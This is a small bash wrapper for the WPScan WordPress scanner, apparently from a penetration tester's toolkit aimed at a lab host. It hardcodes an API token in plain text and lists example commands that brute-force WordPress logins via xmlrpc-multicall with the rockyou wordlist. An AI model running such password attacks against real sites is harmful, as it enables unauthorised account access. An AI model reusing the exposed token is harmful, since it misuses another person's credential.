#!/bin/bash

#WordPress scan
MYTOKEN="KaJMBG9Ityv8eIprRoUKTfofioIAwjVmg90q0RXMtdY"

wpscan --api-token $MYTOKEN $*

exit 0
#examples
wpscan --url http://admin.trilocor.local/ --password-attack xmlrpc-multicall --usernames user-admin.txt --passwords ~/bin/pen/myWordLists/Password/rockyou_clean.txt
wpscan --proxy http://127.0.0.1:8080 --url http://admin.trilocor.local/ --password-attack xmlrpc-multicall --usernames user-admin.txt --passwords ~/bin/pen/myWordLists/Password/rockyou_clean.txt

